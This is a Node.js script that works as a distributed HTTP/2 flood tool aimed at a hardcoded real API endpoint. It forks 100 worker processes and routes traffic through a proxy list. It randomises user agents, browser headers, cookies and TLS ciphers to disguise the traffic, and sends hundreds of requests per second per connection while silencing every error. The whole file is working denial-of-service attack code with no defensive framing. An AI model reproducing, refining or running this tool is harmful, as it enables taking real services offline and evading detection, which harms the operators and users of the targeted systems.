const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

const headers = {};

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

const settings = {
  target: "https://api.betabotz.eu.org/api/download/storyanime?apikey=",
  Rate: "500",
  threads: "100",
  proxyFile: "proxies.txt"
};

const cipherList = [
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_128_GCM_SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES256-SHA384",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-SHA384",
  "ECDHE-ECDSA-AES128-SHA256",
  "DHE-RSA-AES256-GCM-SHA384",
  "DHE-RSA-AES128-GCM-SHA256",
  "DHE-RSA-CHACHA20-POLY1305",
  "TLS_AES_128_CCM_SHA256",
  "TLS_AES_128_CCM_8_SHA256"
];

const acceptHeaders = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const acceptLanguages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "en-US,en;q=0.9,fr;q=0.8",
  "en-US,en;q=0.9,es;q=0.8",
  "en-US,en;q=0.9,de;q=0.8"
];

const acceptEncodings = [
  "gzip, deflate, br",
  "gzip, deflate",
  "br, gzip, deflate",
  "gzip, br"
];

const cacheControls = [
  "no-cache",
  "max-age=0",
  "no-store",
  "must-revalidate"
];

const screenResolutions = [
  "1920x1080",
  "1366x768",
  "1440x900",
  "1536x864",
  "2560x1440"
];

const colorDepths = ["24", "32"];
const deviceMemoryOptions = ["4", "8", "16"];
const hardwareConcurrencyOptions = ["4", "8", "12", "16"];

const proxies = readLines(settings.proxyFile);
const parsedTarget = url.parse(settings.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= settings.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port
    });

    connection.setTimeout(options.timeout * 1000);
    connection.setKeepAlive(true, 60000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");

      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }

      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error" , error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const userAgentv2 = new UserAgent();
  const useragent = userAgentv2.toString();

  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = useragent;
  headers["accept"] = randomElement(acceptHeaders);
  headers["accept-language"] = randomElement(acceptLanguages);
  headers["accept-encoding"] = randomElement(acceptEncodings);
  headers["cache-control"] = randomElement(cacheControls);
  headers["upgrade-insecure-requests"] = "1";
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
  headers["sec-fetch-site"] = "none";
  headers["sec-fetch-user"] = "?1";
  headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(100, 120)}", "Google Chrome";v="${randomIntn(100, 120)}", "Not;A=Brand";v="99"`;
  headers["sec-ch-ua-mobile"] = "?0";
  headers["sec-ch-ua-platform"] = `"${randomElement(['Windows', 'macOS', 'Linux'])}"`;
  headers["referer"] = `https://${parsedTarget.host}/`;
  headers["origin"] = `https://${parsedTarget.host}`;
  headers["dnt"] = "1";
  headers["pragma"] = "no-cache";
  headers["viewport-width"] = randomElement(screenResolutions).split("x")[0];
  headers["device-memory"] = randomElement(deviceMemoryOptions);
  headers["hardware-concurrency"] = randomElement(hardwareConcurrencyOptions);
  headers["color-depth"] = randomElement(colorDepths);
  headers["cookie"] = `session=${crypto.randomBytes(16).toString('hex')}; lang=${randomElement(['en', 'fr', 'es', 'de'])}`;

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 3
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 60000);

    const tlsOptions = {
      ALPNProtocols: ['h2', 'http/1.1', 'h3'],
      ciphers: cipherList[randomIntn(0, cipherList.length)],
      servername: parsedTarget.host,
      socket: connection,
      secure: true,
      rejectUnauthorized: false,
      maxCachedSessions: 50,
      honorCipherOrder: true,
      ecdhCurve: "GREASE:X25519:P-256:P-384:P-521",
      secureProtocol: ["TLSv1_3_method", "TLSv1_2_method"],
      secureOptions: 
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_NO_RENEGOTIATION |
        crypto.constants.SSL_OP_TLSEXT_PADDING |
        crypto.constants.SSL_OP_ALL,
      keepAlive: true,
      keepAliveMsecs: 1000,
      maxSockets: 100,
      highWaterMark: 16384,
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3'
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 4096,
        maxConcurrentStreams: 100,
        initialWindowSize: 65535,
        maxHeaderListSize: 8192,
        enablePush: false
      },
      maxSessionMemory: 1024,
      createConnection: () => tlsConn,
      socket: connection
    });

    client.settings({
      headerTableSize: 4096,
      maxConcurrentStreams: 100,
      initialWindowSize: 65535,
      maxHeaderListSize: 8192,
      enablePush: false
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < settings.Rate; i++) {
          const request = client.request(headers)
            .on("response", response => {
              request.close();
              request.destroy();
            });

          request.end();
        }
      }, 1000);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
    });

    client.on("error", error => {
      client.destroy();
      connection.destroy();
    });
  });
}